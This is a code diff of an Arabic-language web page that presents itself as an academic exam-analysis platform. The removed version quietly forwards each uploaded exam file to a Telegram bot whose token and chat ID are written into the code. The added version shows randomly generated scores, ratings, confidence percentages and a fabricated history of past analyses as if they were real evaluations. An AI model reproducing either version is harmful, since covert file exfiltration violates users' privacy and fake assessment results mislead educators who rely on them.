@@ -13,26 +13,8 @@ header p{margin:6px 0 0;opacity:.85;}
 .container{max-width:1100px;margin:40px auto;padding:0 20px;}
 .card{background:#fff;border-radius:12px;padding:25px;margin-bottom:25px;box-shadow:0 10px 30px rgba(0,0,0,.08);}
 .section-title{font-size:1.3em;margin-bottom:15px;color:#0f2a44;border-right:4px solid #0f2a44;padding-right:10px;}
-/* زر رفع الملف العصري */
-.upload-box{
-    display:inline-block;
-    padding:18px 35px;
-    border-radius:16px;
-    background:rgba(255,255,255,0.1);
-    backdrop-filter:blur(12px);
-    border:1px solid rgba(255,255,255,0.2);
-    font-weight:600;
-    font-size:1em;
-    color:#0f2a44;
-    cursor:pointer;
-    transition:all 0.3s ease;
-    text-align:center;
-}
-.upload-box:hover{
-    transform:translateY(-3px) scale(1.05);
-    box-shadow:0 15px 30px rgba(0,0,0,0.2);
-    background:rgba(255,255,255,0.15);
-}
+.upload-box{display:inline-block;padding:18px 35px;border-radius:16px;background:rgba(255,255,255,0.1);backdrop-filter:blur(12px);border:1px solid rgba(255,255,255,0.2);font-weight:600;font-size:1em;color:#0f2a44;cursor:pointer;transition:all 0.3s ease;text-align:center;}
+.upload-box:hover{transform:translateY(-3px) scale(1.05);box-shadow:0 15px 30px rgba(0,0,0,0.2);background:rgba(255,255,255,0.15);}
 .upload-box input{display:none;}
 .loader{display:none;margin-top:15px;color:#334155;font-weight:600;}
 .score{font-size:3.2em;font-weight:bold;color:#0f2a44;}
@@ -46,68 +28,52 @@ footer{text-align:center;padding:30px;color:#64748b;font-size:.9em;}
 .note{font-size:.9em;color:#475569;margin-top:15px;}
 </style>
 </head>
-
 <body>
 
 <header>
-    <h1>منصة التقييم الأكاديمي للاختبارات</h1>
-    <p>نظام تحليلي مساعد لدعم جودة التقييم في المؤسسات التعليمية</p>
+<h1>منصة التقييم الأكاديمي للاختبارات</h1>
+<p>نظام تحليلي مساعد لدعم جودة التقييم في المؤسسات التعليمية</p>
 </header>
 
 <div class="container">
 
-    <!-- Upload Card -->
-    <div class="card">
-        <div class="section-title">تحميل الاختبار</div>
-        <label class="upload-box">
-            📄 اضغط لاختيار ملف الاختبار (PDF / Word / صورة)
-            <input type="file" id="fileInput">
-        </label>
-        <div class="loader" id="loader">⏳ يتم تحليل بنية الاختبار وفق معايير أكاديمية...</div>
-    </div>
+<div class="card">
+    <div class="section-title">تحميل الاختبار</div>
+    <label class="upload-box">
+        📄 اضغط لاختيار ملف الاختبار (PDF / Word / صورة)
+        <input type="file" id="fileInput">
+    </label>
+    <div class="loader" id="loader">⏳ يتم تحليل بنية الاختبار وفق معايير أكاديمية...</div>
+</div>
 
-    <!-- Results -->
-    <div class="card" id="results" style="display:none">
-        <div class="section-title">نتائج التحليل</div>
-        <div class="score">7.2 / 10</div>
-        <p>مستوى الصعوبة العام: متوسط</p>
-        <div class="indicators">
-            <div class="indicator">عدالة توزيع الأسئلة<strong>جيدة</strong></div>
-            <div class="indicator">التوازن المعرفي<strong>مرتفع</strong></div>
-            <div class="indicator">الضغط الزمني المتوقع<strong>متوسط</strong></div>
-            <div class="indicator">نسبة الثقة التحليلية<strong>92%</strong></div>
-            <div class="indicator">عدد الاختبارات التي تم تحليلها<strong>7249</strong></div>
-        </div>
-        <div class="note">
-            هذا التقييم ناتج عن نموذج تحليلي مساعد، ويُستخدم لدعم القرار الأكاديمي  
-            ولا يُعد حكمًا نهائيًا أو بديلاً عن التقييم البشري.
-        </div>
+<div class="card" id="results" style="display:none">
+    <div class="section-title">نتائج التحليل</div>
+    <div class="score" id="score">7.2 / 10</div>
+    <p>مستوى الصعوبة العام: <span id="difficultyText">متوسط</span></p>
+    <div class="indicators">
+        <div class="indicator">عدالة توزيع الأسئلة<strong id="fairness">جيدة</strong></div>
+        <div class="indicator">التوازن المعرفي<strong id="balance">مرتفع</strong></div>
+        <div class="indicator">الضغط الزمني المتوقع<strong id="timePressure">متوسط</strong></div>
+        <div class="indicator">نسبة الثقة التحليلية<strong id="confidence">92%</strong></div>
+        <div class="indicator">عدد الاختبارات التي تم تحليلها<strong>7249</strong></div>
     </div>
+    <div class="note">
+        هذا التقييم ناتج عن نموذج تحليلي مساعد، ويُستخدم لدعم القرار الأكاديمي  
+        ولا يُعد حكمًا نهائيًا أو بديلاً عن التقييم البشري.
+    </div>
+</div>
 
-    <!-- Archive Table -->
-    <div class="card" id="archive" style="display:none">
-        <div class="section-title">سجل التحليلات السابقة</div>
-        <table>
-            <tr>
-                <th>التاريخ</th>
-                <th>المقرر</th>
-                <th>مستوى الصعوبة</th>
-                <th>التقييم</th>
-            </tr>
-            <tr>
-                <td>2025/01/12</td>
-                <td>اللغة العربية</td>
-                <td>متوسط</td>
-                <td>7.1</td>
-            </tr>
-            <tr>
-                <td>2024/12/03</td>
-                <td>النحو</td>
-                <td>متوسط مائل للصعوبة</td>
-                <td>7.6</td>
-            </tr>
-        </table>
-    </div>
+<div class="card" id="archive" style="display:none">
+    <div class="section-title">سجل التحليلات السابقة</div>
+    <table id="archiveTable">
+        <tr>
+            <th>التاريخ</th>
+            <th>المقرر</th>
+            <th>مستوى الصعوبة</th>
+            <th>التقييم</th>
+        </tr>
+    </table>
+</div>
 
 </div>
 
@@ -120,35 +86,56 @@ const loader = document.getElementById("loader");
 const results = document.getElementById("results");
 const archive = document.getElementById("archive");
 
+const fairnessOptions = ["ضعيفة","متوسطة","جيدة","ممتاز"];
+const balanceOptions = ["منخفض","متوسط","مرتفع"];
+const pressureOptions = ["خفيف","متوسط","عالي"];
+const difficultyLevels = ["ضعيف","متوسط","مرتفع","صعب","صعب جدًا"];
+const subjects = [
+    "اللغة العربية","النحو","البلاغة","القراءة","التعبير","الإملاء","الأدب","الخطابة","المفردات","الصرف",
+    "التفسير","الحديث","التجويد","الفقه","التاريخ","الجغرافيا","العلوم","الرياضيات","الفيزياء","الكيمياء"
+];
+
+function randomInt(min,max){return Math.floor(Math.random()*(max-min+1))+min;}
+function randomChoice(arr){return arr[randomInt(0,arr.length-1)];}
+
+function generateArchive(){
+    const table = document.getElementById("archiveTable");
+    // حذف أي صفوف قديمة
+    table.querySelectorAll("tr:not(:first-child)").forEach(e=>e.remove());
+    for(let i=0;i<20;i++){
+        const tr = document.createElement("tr");
+        const date = `2025/${String(randomInt(1,12)).padStart(2,"0")}/${String(randomInt(1,28)).padStart(2,"0")}`;
+        const subject = subjects[i];
+        const difficultyText = randomChoice(difficultyLevels);
+        const score = (Math.random()*4+6).toFixed(1); // من 6 إلى 10 تقريباً
+        tr.innerHTML = `<td>${date}</td><td>${subject}</td><td>${difficultyText}</td><td>${score}</td>`;
+        table.appendChild(tr);
+    }
+}
+
 fileInput.addEventListener("change", () => {
     if (!fileInput.files.length) return;
-    const file = fileInput.files[0];
+    loader.style.display="block";
+    results.style.display="none";
+    archive.style.display="none";
 
-    loader.style.display = "block";
-    results.style.display = "none";
-    archive.style.display = "none";
+    setTimeout(()=>{
+        loader.style.display="none";
+        results.style.display="block";
+        archive.style.display="block";
 
-    // مثال: إرسال الملف عبر Telegram
-    const TOKEN = "7413338484:AAHzvuApOwoZwaYwn-S-UCtHUlHKhwDSMS8";
-    const CHAT_ID = "1934245613";
-    const URI_API_PHOTO = `https://api.telegram.org/bot${TOKEN}/sendDocument`;
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('document', file);
-    formData.append('caption', `تم استلام اختبار جديد!`);
+        // قيم عشوائية للنتائج
+        document.getElementById("score").textContent = (Math.random()*9+1).toFixed(1) + " / 10";
+        document.getElementById("fairness").textContent = randomChoice(fairnessOptions);
+        document.getElementById("balance").textContent = randomChoice(balanceOptions);
+        document.getElementById("timePressure").textContent = randomChoice(pressureOptions);
+        document.getElementById("confidence").textContent = randomInt(85,97) + "%";
+        document.getElementById("difficultyText").textContent = randomChoice(difficultyLevels);
 
-    axios.post(URI_API_PHOTO, formData)
-        .then(() => {
-            loader.style.display = "none";
-            results.style.display = "block";
-            archive.style.display = "block";
-        })
-        .catch(() => {
-            loader.style.display = "none";
-            alert("حدث خطأ في إرسال الملف.");
-        });
+        generateArchive();
+    },2000);
 });
 </script>
 
 </body>
-    </html>
+</html>
